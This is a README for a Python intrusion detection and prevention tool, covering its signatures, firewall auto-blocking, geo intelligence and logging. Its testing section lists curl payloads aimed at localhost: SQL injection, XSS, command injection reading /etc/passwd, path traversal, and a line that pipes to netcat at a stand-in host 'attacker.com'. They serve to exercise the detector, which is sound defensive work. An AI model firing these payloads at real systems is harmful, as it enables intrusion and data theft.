# 🛡️ IPDS Pro — Intrusion Prevention & Detection System

> **Real-time network threat detection, geo intelligence, and automated firewall response — all in one desktop application.**

[![Python](https://img.shields.io/badge/Python-3.10%2B-blue?style=flat-square)](https://python.org)
[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux-lightgrey?style=flat-square)](#)
[![License](https://img.shields.io/badge/License-Educational-green?style=flat-square)](#)
[![Status](https://img.shields.io/badge/Status-Active-brightgreen?style=flat-square)](#)

---

## 📖 Table of Contents

1. [Project Introduction](#-project-introduction)
2. [Features](#-features)
3. [Installation Guide](#-installation-guide)
4. [GeoLite2 Setup](#-geolite2-setup)
5. [Running the Tool](#-running-the-tool)
6. [Dashboard Overview](#-dashboard-overview)
7. [Geo Threat Map](#-geo-threat-map)
8. [Database System](#-database-system)
9. [JSON & EVE Logging](#-json--eve-logging)
10. [File Structure](#-file-structure)
11. [Testing the Tool](#-testing-the-tool)
12. [Troubleshooting](#-troubleshooting)
13. [Architecture](#-architecture)
14. [Security Notes](#-security-notes)
15. [Future Improvements](#-future-improvements)

---

## 🔍 Project Introduction

**IPDS Pro** is a professional-grade, desktop-based **Intrusion Prevention and Detection System** built in Python. It captures live network packets on your machine, inspects every packet in real time against a library of attack signatures, and fires instant alerts — while also optionally **blocking attacker IPs at the firewall level**.

### What IPDS Pro Does

**Real-Time Packet Inspection**
Every packet flowing through your network interface is intercepted by Scapy and passed through the detection engine. Packet headers, payloads, ports, and flags are all analyzed within milliseconds.

**IDS Mode (Detection)**
In IDS mode, IPDS watches traffic silently and logs every suspicious match. Alerts are displayed in the live dashboard with full packet details, signature matches, severity levels, and source attribution.

**IPS Mode (Prevention)**
Enable IPS Auto-Block and any `HIGH` severity alert immediately triggers a firewall rule — either `iptables` on Linux or Windows Firewall via `netsh` on Windows — dropping all further traffic from that attacker IP.

**Threat Intelligence System**
Each IP address is profiled in real time using a multi-factor threat scoring engine. Scores accumulate based on attack frequency, type severity, and category diversity. Scores decay over time for IPs that stop attacking. When an IP crosses thresholds, its status escalates: `CLEAN → SUSPICIOUS → MALICIOUS → BLOCKED`.

**Geo Intelligence Layer**
Every source IP is resolved against MaxMind GeoLite2 databases to determine country, city, ISP, ASN, and coordinates. Cloud provider (AWS, Azure, GCP, etc.), TOR exit node, and VPN status are detected automatically. All data is visualized on a live world threat map.

**Live Monitoring Dashboard**
A full-featured desktop GUI — built with PyQt6 and an embedded WebEngine browser — provides real-time visibility into all traffic, alerts, blocked IPs, threat scores, and geo data without any external browser needed.

---

## ✨ Features

### Core Detection Engine

| Feature | Details |
|---|---|
| **Live Packet Capture** | Scapy-based sniffer on any interface; BPF kernel-level pre-filter for efficiency |
| **20 Built-in Signatures** | SQLi, XSS, CMDi, Directory Traversal, DoS, Brute Force |
| **Multi-Condition Signatures** | Context-aware rules reduce false positives (payload length gates, port specificity) |
| **HTTP Protocol Awareness** | Full HTTP method / path / header / body parsing for accurate layer-7 detection |
| **Threshold-Based Rules** | Rate-limited detection for floods, ICMP storms, UDP amplification, SSH/FTP brute force |
| **Signature Library** | 20 signatures across 6 categories, all configurable via Python dicts |

### Threat Response

| Feature | Details |
|---|---|
| **Auto IP Blocking** | `HIGH` severity alerts trigger instant firewall rules in IPS mode |
| **Strike-Based Blocking** | Warn → temporary block (5 min) → permanent block as threat score rises |
| **iptables Support** | Linux: `iptables -A INPUT -s <IP> -j DROP` |
| **Windows Firewall Support** | Windows: `netsh advfirewall firewall add rule` |
| **One-Click Manual Block** | Block any IP from the Live Traffic or Alerts tab |
| **Instant Unblock** | Remove firewall rules from the Blocked IPs tab at any time |

### Threat Scoring & Correlation

| Feature | Details |
|---|---|
| **Per-IP Threat Scoring** | Weighted 0–100 score per IP, updated in real time |
| **Score Decay** | Scores decay over time for IPs that go quiet |
| **Attack Correlation** | Multi-vector attacks (e.g., SQLi + CMDi from same IP) → `CRITICAL` alert |
| **Behavioral Tracking** | Time-windowed packet and attack counters per IP |
| **MetricsTracker** | System-wide packets/sec, alerts/sec, top attackers leaderboard |

### Geo Intelligence

| Feature | Details |
|---|---|
| **GeoIP Lookup** | MaxMind GeoLite2-City: country, region, city, coordinates |
| **ASN / ISP Lookup** | MaxMind GeoLite2-ASN: autonomous system number and organization name |
| **TOR Detection** | Daily-refreshed TOR exit node list from torproject.org |
| **VPN Detection** | Heuristic detection via ASN keyword analysis |
| **Cloud Provider Detection** | AWS, Azure, GCP, DigitalOcean, Cloudflare, Linode, Vultr, OVH — via CIDR matching |
| **Country Risk Scoring** | Configurable country-level risk map (0–100) built into the engine |
| **LRU Cache** | Zero repeated GeoIP lookups — O(1) after first resolution per IP |
| **Real-Time Threat Map** | Live world map with attack flows, origin markers, and threat colors |

### Logging & Observability

| Feature | Details |
|---|---|
| **SQLite Database** | All packets, alerts, blocked IPs, geo events, and IP stats persisted locally |
| **Rotating Text Log** | `logs/ipds.log` — human-readable, 5 MB × 5 backups |
| **JSON Structured Log** | `logs/ipds_structured.jsonl` — machine-readable, `WARNING`+ events |
| **Suricata EVE Log** | `logs/ipds_eve.jsonl` — fully Suricata EVE-compatible, SIEM-ready |
| **SIEM Integration** | ELK Stack, Splunk, Graylog, and any JSONL-ingestible SIEM supported |

---

## 🚀 Installation Guide

### Step 1 — Python 3.10+

Verify your Python version:

```bash
python3 --version
```

Install if missing:

```bash
# Linux (Debian/Ubuntu)
sudo apt install python3 python3-pip

# Windows — download from:
# https://python.org/downloads
# ✅ Check "Add Python to PATH" during installation
```

---

### Step 2 — Npcap (Windows Only)

Scapy requires **Npcap** for raw packet capture on Windows. WinPcap will **not** work.

1. Download from: **https://npcap.com/#download**
2. Install with **"WinPcap API-compatible Mode"** checked
3. Reboot if prompted

> **Linux users**: No extra driver needed — root privileges grant raw socket access directly.

---

### Step 3 — Python Dependencies

```bash
cd ipds_tool
pip install -r requirements.txt
```

On some Linux systems where pip is managed by the OS:

```bash
pip install -r requirements.txt --break-system-packages
```

**Key dependencies include:**

| Package | Purpose |
|---|---|
| `scapy` | Packet capture and dissection |
| `PyQt6` | Desktop GUI framework |
| `PyQt6-WebEngine` | Embedded browser for the HTML dashboard |
| `geoip2` | MaxMind GeoLite2 database reader |
| `requests` | TOR exit node list download |
| `psutil` | System resource monitoring |

---

### Step 4 — Find Your Network Interface

Run the helper script to identify your correct interface name:

```bash
# Windows
python find_interface.py

# Linux
ip a
# or
ifconfig
```

Common interface names:

| OS | Wired | Wireless |
|---|---|---|
| Linux | `eth0` | `wlan0` |
| Windows | `Ethernet` | `Wi-Fi` or NPF GUID |
| macOS | `en0` | `en1` |

---

## 🌍 GeoLite2 Setup

Geo Intelligence requires two free MaxMind GeoLite2 databases. Follow these steps exactly.

### Step 1 — Create a MaxMind Account

1. Go to **https://www.maxmind.com/en/geolite2/signup**
2. Fill in the registration form and verify your email
3. Log in to your MaxMind account

### Step 2 — Generate a License Key

1. In your account dashboard, go to **Services → My License Key**
2. Click **Generate new license key**
3. Give it a name (e.g., `IPDS-Tool`)
4. Copy the key — **you will only see it once**

### Step 3 — Download the Databases

From your MaxMind dashboard under **Download Files**:

| Database | Filename | Use |
|---|---|---|
| GeoLite2 City | `GeoLite2-City.mmdb` | Country, region, city, coordinates |
| GeoLite2 ASN | `GeoLite2-ASN.mmdb` | ISP name, ASN number |

Download the **MaxMind DB binary** format (`.mmdb`) for both.

### Step 4 — Place the Database Files

Create a `geoip/` folder inside your project directory and place both `.mmdb` files there:

```
ipds_tool/
└── geoip/
    ├── GeoLite2-City.mmdb
    └── GeoLite2-ASN.mmdb
```

> **Note**: If files are placed elsewhere, update the paths passed to `GeoEngine()` in `geo_intelligence.py`.

### Step 5 — Verify Setup

When you launch IPDS Pro, the Geo Intelligence tab will populate with country data, cloud badges, TOR flags, and the threat map. If the tab is empty, see [Troubleshooting](#-troubleshooting).

---

## ▶️ Running the Tool

> **Important**: Raw packet capture requires elevated privileges on all operating systems.

### Windows — Run as Administrator

```bat
python main.py
```

> Right-click your terminal and select **"Run as Administrator"** before executing.

### Linux / macOS — Run as Root

```bash
sudo python3 main.py
```

> On Linux, you can alternatively grant Scapy capabilities to avoid full root:
> ```bash
> sudo setcap cap_net_raw=eip $(which python3)
> python3 main.py
> ```

---

## 🖥️ Dashboard Overview

IPDS Pro launches a full desktop GUI with an embedded browser dashboard. All tabs update in real time.

### Overview Tab
System health at a glance. Displays total packets captured, alerts fired, IPs currently blocked, packets/sec, and top attacking IPs. System resource usage (CPU, RAM, GPU if available) is also shown via psutil/pynvml.

### Live Traffic Tab
Every packet flowing through your interface appears here as a table row:

| Column | Description |
|---|---|
| Time | Capture timestamp |
| Src IP | Source IP address |
| Dst IP | Destination IP address |
| Protocol | TCP / UDP / ICMP |
| Port | Destination port |
| Signature | Matched rule name (if any) |
| Severity | HIGH / MEDIUM / LOW / INFO |

- **White rows** — clean traffic
- **Red/orange rows** — signature matched
- Click any row to see full packet details and the **⛔ Block This IP** button in the right panel

### Alerts Tab
Every signature match is logged here with:
- SID, message, category, severity
- Source IP, destination IP, timestamp
- Packet payload excerpt
- Threat score at time of alert
- Correlation tag (if multi-vector attack was detected)

### Geo Threat Map Tab
Interactive world map showing live attack origins. See the [Geo Threat Map](#-geo-threat-map) section for full details.

### Blocked IPs Tab
All currently blocked IPs with:
- IP address, block reason, timestamp
- Block type (manual / auto / temporary / permanent)
- **Unblock** button to remove the firewall rule instantly

### Signatures Tab
All 20 built-in detection rules displayed in a searchable table:
- SID, pattern, category, severity
- Detection method (content match / threshold / protocol)

### Logs Tab
Live scrolling log of all IPDS events. Mirrors `logs/ipds.log` in real time.

### Threat Scores Tab
Live per-IP threat score leaderboard. Shows current score, status (`CLEAN` / `SUSPICIOUS` / `MALICIOUS` / `BLOCKED`), packet count, attack count, and last-seen time.

### Correlations Tab
Lists multi-vector correlation events — cases where a single IP has triggered multiple attack categories within a short window, escalating to a `CRITICAL` alert.

---

## 🗺️ Geo Threat Map

The Geo Threat Map is a live, interactive world map rendered inside the embedded dashboard browser.

### What You See

**Attack Origin Markers**
Each source IP that has triggered an alert is plotted on the map at its resolved geographic coordinates. Markers are color-coded by threat status:

| Color | Status |
|---|---|
| 🔴 Red | MALICIOUS / BLOCKED |
| 🟠 Orange | SUSPICIOUS |
| 🟡 Yellow | CLEAN (but observed) |
| 🟣 Purple | TOR exit node |
| ☁️ Blue | Cloud provider (AWS, Azure, GCP, etc.) |

**Connection Flow Lines**
Animated arcs connect attacker source coordinates to your machine's location, visualizing the attack direction in real time. Line thickness and color reflect threat severity.

**Country-to-Country Attack Lines**
Aggregated view showing which countries are generating the most attack traffic toward your network.

**Live IP Plotting**
New attacker IPs appear on the map within seconds of their first alert, pulled from the `geo_ip_stats` table.

**Cloud / TOR / VPN Markers**
Special badges indicate when an attacker is routing through cloud infrastructure, the TOR network, or a VPN — helping you assess the sophistication and anonymization intent of the attack.

**Heatmap Layer**
Dense attack regions glow brighter, providing an at-a-glance view of which areas of the world are most active.

---

## 🗄️ Database System

All data is persisted in a **SQLite** database located at `logs/ipds.db`. SQLite WAL mode is enabled for concurrent read/write performance.

### Database Files

| File | Purpose |
|---|---|
| `logs/ipds.db` | Main SQLite database |
| `logs/ipds.db-wal` | Write-Ahead Log (WAL) — active during writes |
| `logs/ipds.db-shm` | Shared memory index for WAL mode |

> Do not delete `.db-wal` or `.db-shm` while IPDS is running — they are part of the active transaction log. They will be automatically merged into `ipds.db` on clean shutdown.

### Tables

| Table | Description |
|---|---|
| `packets` | Every captured packet (timestamp, IPs, protocol, ports, payload, matched SID) |
| `alerts` | Every signature match with `threat_score` and `correlation` columns |
| `blocked_ips` | All blocked IPs with reason, timestamp, and block type |
| `geo_events` | Per-alert geo event log (coordinates, country, ASN, threat type) |
| `geo_ip_stats` | Live per-IP attribution record (one row per unique IP, upserted every 5 seconds) |

### Key Columns Added by Migration

The `db_migration.sql` file patches existing tables and creates new ones safely (all statements use `IF NOT EXISTS` / `ALTER TABLE` guards — safe to re-run):

- **`alerts.threat_score`** — integer 0–100, the IP's threat score at alert time
- **`alerts.correlation`** — text tag if this alert was part of a multi-vector correlation event

### Running the Migration Manually

The migration runs automatically on app startup. To run it manually:

```bash
sqlite3 logs/ipds.db < db_migration.sql
```

---

## 📋 JSON & EVE Logging

IPDS Pro produces three log outputs simultaneously.

### Human-Readable Log — `logs/ipds.log`

Standard rotating text log. All `INFO`+ events. 5 MB per file, 5 backup files.

```
2025-01-15 14:23:01 [INFO] Capture started on interface: eth0
2025-01-15 14:23:05 [WARNING] ALERT: SID=3000003 | TEST SQLi - UNION | src=192.168.1.45 | sev=HIGH
2025-01-15 14:23:05 [WARNING] IP BLOCKED: 192.168.1.45 (AUTO-IPS)
```

### Structured JSON Log — `logs/ipds_structured.jsonl`

Machine-readable JSON Lines, one object per line. `WARNING`+ events only. 10 MB per file, 3 backups.

```json
{"ts": "2025-01-15T14:23:05.123Z", "level": "WARNING", "msg": "ALERT: SID=3000003 ..."}
```

### Suricata EVE Log — `logs/ipds_eve.jsonl`

Fully Suricata EVE-compatible JSON Lines format. This is the primary log for SIEM integration.

**Event Types:**

| `event_type` | Triggered By |
|---|---|
| `traffic` | Every captured packet (sampled) |
| `alert` | Every signature match |
| `block` | Every IP block action |

**Sample `alert` EVE record:**

```json
{
  "timestamp": "2025-01-15T14:23:05.123456Z",
  "event_type": "alert",
  "flow_id": 8472938471234567,
  "src_ip": "192.168.1.45",
  "src_port": 54231,
  "dst_ip": "10.0.0.1",
  "dst_port": 80,
  "proto": "TCP",
  "alert": {
    "action": "blocked",
    "gid": 1,
    "signature_id": 3000003,
    "rev": 1,
    "signature": "TEST SQLi - UNION",
    "category": "SQLi",
    "severity": 2,
    "threat_score": 78.5,
    "correlation": "MULTI-VECTOR:SQLi+CMDi"
  },
  "http": {
    "method": "GET",
    "url": "/?q=UNION+SELECT+password+FROM+users",
    "hostname": "localhost",
    "http_user_agent": "curl/8.0"
  }
}
```

### SIEM Integration

The EVE JSONL format is directly ingestible by:

- **Elastic Stack (ELK)** — Use Filebeat with the Suricata module; point it to `logs/ipds_eve.jsonl`
- **Splunk** — Use the Universal Forwarder or Splunk for Suricata app
- **Graylog** — GELF/Syslog input with a JSON extractor
- **Any SIEM** — Any system that supports JSONL file tailing or Suricata EVE format

---

## 📁 File Structure

```
ipds_tool/
│
├── main.py                    ← Original IPDS application (legacy / reference)
├── app.py                     ← IPDS Pro — upgraded main application (use this)
├── geo_intelligence.py        ← Geo Intelligence & IP Attribution Engine
├── find_interface.py          ← Helper: lists all network interfaces with IPs
├── db_migration.sql           ← Database schema migration (auto-run on startup)
├── dashboard.html             ← HTML/JS dashboard (loaded by embedded WebEngine)
│
├── geoip/                     ← MaxMind GeoLite2 databases (you provide these)
│   ├── GeoLite2-City.mmdb
│   └── GeoLite2-ASN.mmdb
│
├── logs/                      ← All runtime output (auto-created on first run)
│   ├── ipds.log               ← Human-readable rotating text log
│   ├── ipds_structured.jsonl  ← JSON structured log (WARNING+ events)
│   ├── ipds_eve.jsonl         ← Suricata EVE-compatible JSONL (SIEM-ready)
│   ├── ipds.db                ← SQLite database (all data)
│   ├── ipds.db-wal            ← SQLite WAL file (active during writes)
│   └── ipds.db-shm            ← SQLite shared memory index
│
├── requirements.txt           ← Python dependencies
└── README.md                  ← This file
```

---

## 🧪 Testing the Tool

Use these commands in a **second terminal** to generate traffic your tool will detect. No real attack infrastructure needed.

### SQL Injection

```bash
curl "http://localhost/?id=1' OR '1'='1"
curl "http://localhost/?q=UNION SELECT password FROM users"
curl "http://localhost/?q=SELECT * FROM accounts"
curl "http://localhost/?action=DROP TABLE users"
```

### Cross-Site Scripting (XSS)

```bash
curl "http://localhost/?q=<script>alert('xss')</script>"
curl "http://localhost/?url=javascript:void(0)"
curl "http://localhost/?input=<script>document.cookie</script>"
```

### Command Injection

```bash
curl "http://localhost/?cmd=ls&&cat /etc/passwd"
curl "http://localhost/?input=test\`whoami\`"
curl "http://localhost/?exec=ping | nc attacker.com 4444"
```

### Directory Traversal

```bash
curl "http://localhost/../../etc/passwd"
curl "http://localhost/../../../windows/system32/cmd.exe"
```

### SSH Brute Force (generates multiple SYN packets to port 22)

```bash
for i in {1..10}; do nc -z localhost 22; sleep 0.1; done
```

### HTTP Flood (DoS simulation)

```bash
for i in {1..50}; do curl -s http://localhost/ > /dev/null; done
```

---

## 🔧 Troubleshooting

### Geo Dashboard Is Empty

**Cause**: GeoLite2 `.mmdb` files are missing or in the wrong location.

**Fix**:
1. Confirm `geoip/GeoLite2-City.mmdb` and `geoip/GeoLite2-ASN.mmdb` exist
2. Check that `geoip2` is installed: `pip install geoip2`
3. Look in `logs/ipds.log` for lines containing `geoip` or `GeoEngine`

---

### "Missing GeoLite2 Database" Error

```
geoip2.errors.DatabaseError: ...
```

Re-download from MaxMind with a fresh license key. Free accounts require re-download every 30 days.

---

### JavaScript Errors in Dashboard

**Cause**: The HTML dashboard failed to load or the WebEngine bridge is broken.

**Fix**:
1. Ensure `PyQt6-WebEngine` is installed: `pip install PyQt6-WebEngine`
2. Check that `dashboard.html` is in the same directory as `app.py`
3. Run from the `ipds_tool/` directory, not a subdirectory

---

### No Packets Showing in Live Traffic

1. Confirm you selected the correct interface in the top-bar dropdown
2. Verify you are running as root (Linux) or Administrator (Windows)
3. Generate traffic yourself: `ping google.com`
4. On Windows — confirm Npcap is installed (not WinPcap)

---

### Permission Denied (Linux)

```bash
sudo python3 app.py
```

Or grant capabilities without full root:

```bash
sudo setcap cap_net_raw=eip $(which python3)
python3 app.py
```

---

### IP Blocking Not Working (Linux)

```bash
sudo apt install iptables
sudo python3 app.py
```

Verify rules are being added:

```bash
sudo iptables -L INPUT -n | grep DROP
```

---

### IP Blocking Not Working (Windows)

1. Open Command Prompt as Administrator
2. Verify rules are being added:
   ```bat
   netsh advfirewall firewall show rule name=all | findstr IPDS
   ```

---

### Binary / Garbled Log Output

This happens when Python uses the system default encoding (cp1252 on Windows) instead of UTF-8. IPDS Pro explicitly sets `encoding="utf-8"` on all file handlers. If you see garbled text in older log files, they were written before this fix — new logs will be correct.

---

### Scapy Not Installed

```bash
pip install scapy
# or on Linux:
sudo pip3 install scapy
```

---

## 🏗️ Architecture

```
┌─────────────────────────────────────────────────────────────────────────┐
│                          IPDS Pro — Data Pipeline                        │
└─────────────────────────────────────────────────────────────────────────┘

  Network Interface (eth0 / wlan0 / NPF GUID)
          │
          │  raw frames
          ▼
  ┌───────────────────┐
  │   Scapy Sniffer   │  ← BPF kernel-level pre-filter
  │  (CaptureWorker)  │    rate limiter per suspicious IP
  └────────┬──────────┘
           │  IP/TCP/UDP/ICMP packets
           ▼
  ┌───────────────────┐
  │   HTTP Parser     │  ← method, path, headers, body extraction
  └────────┬──────────┘
           │  enriched packet dict
           ▼
  ┌───────────────────┐
  │  Detection Engine │  ← 20 signatures (content + threshold + protocol)
  │                   │    multi-condition, context-aware matching
  └────────┬──────────┘
           │  alert objects + threat scores
           ├─────────────────────────────────────────────────────┐
           ▼                                                     ▼
  ┌───────────────────┐                               ┌──────────────────┐
  │ Threat Scoring &  │  ← per-IP score 0–100         │   EVE Logger     │
  │ Correlation Engine│    decay, strike tracking     │ (ipds_eve.jsonl) │
  └────────┬──────────┘    multi-vector CRITICAL       └──────────────────┘
           │
           ├──────────────────────────────┐
           ▼                              ▼
  ┌───────────────────┐        ┌──────────────────────┐
  │  Geo Intelligence │        │   Response Engine    │
  │  (GeoEngine +     │        │  (ResponseEngine)    │
  │   IPTracker)      │        │                      │
  │                   │        │  warn → temp block   │
  │  • GeoLite2 City  │        │  → permanent block   │
  │  • GeoLite2 ASN   │        └──────────┬───────────┘
  │  • TOR detection  │                   │
  │  • Cloud / VPN    │                   ▼
  │  • Country risk   │        ┌──────────────────────┐
  └────────┬──────────┘        │   Firewall Layer     │
           │                   │                      │
           │                   │  Linux: iptables     │
           ▼                   │  Windows: netsh      │
  ┌───────────────────┐        └──────────────────────┘
  │  SQLite Database  │
  │  (logs/ipds.db)   │
  │                   │
  │  • packets        │
  │  • alerts         │
  │  • blocked_ips    │
  │  • geo_events     │
  │  • geo_ip_stats   │
  └────────┬──────────┘
           │
           ▼
  ┌───────────────────────────────────────────────────┐
  │              Live Dashboard (PyQt6 + WebEngine)    │
  │                                                   │
  │  Overview │ Live Traffic │ Alerts │ Geo Map       │
  │  Blocked IPs │ Signatures │ Logs │ Threat Scores │
  │  Correlations                                     │
  └───────────────────────────────────────────────────┘
```

---

## 🔐 Security Notes

> **IPDS Pro is intended for authorized network monitoring only.**

- Only deploy and run IPDS Pro on networks and systems **you own or have explicit written permission to monitor**
- Running a packet sniffer on a network without authorization may violate computer crime laws in your jurisdiction (e.g., CFAA in the US, Computer Misuse Act in the UK)
- IP blocking via iptables/netsh makes changes to your system's firewall — review blocked IPs regularly
- The GeoLite2 databases contain geolocation data; handle them per MaxMind's terms of service
- Running as `root` or Administrator is required for raw packet capture — do not expose the application to untrusted inputs
- This tool is designed for educational purposes, lab environments, authorized penetration testing, and network security research

---

## 🔮 Future Improvements

| Feature | Description |
|---|---|
| **AI/ML Threat Detection** | Anomaly detection model trained on baseline traffic to catch zero-day patterns that signature rules miss |
| **Remote Sensor Network** | Lightweight sensor agents that forward packets to a central IPDS Pro instance for multi-site monitoring |
| **PCAP Export** | Export captured sessions as `.pcap` files for replay in Wireshark or offline forensics |
| **Threat Feed Integration** | Pull live threat intelligence from AbuseIPDB, AlienVault OTX, or Shodan to enrich alerts |
| **SOC Integration** | Native webhook/API output for TheHive, PagerDuty, Slack, or Microsoft Teams alerting |
| **Active Directory Correlation** | Map source IPs to AD user accounts for insider threat detection |
| **Dashboard Dark/Light Themes** | User-selectable UI theme with persistent preferences |
| **PCAP Replay Mode** | Load an existing `.pcap` file and run it through the detection engine offline |
| **REST API** | Expose alerts, blocked IPs, and metrics via a local REST API for external tool integration |
| **Email / SMS Alerts** | Real-time notification delivery for `HIGH` and `CRITICAL` severity events |

---

## 📄 License

This project is created for **educational and research purposes**. Use only on networks and systems you are authorized to monitor.

---

*Built with Python, Scapy, PyQt6, MaxMind GeoLite2, and SQLite.*
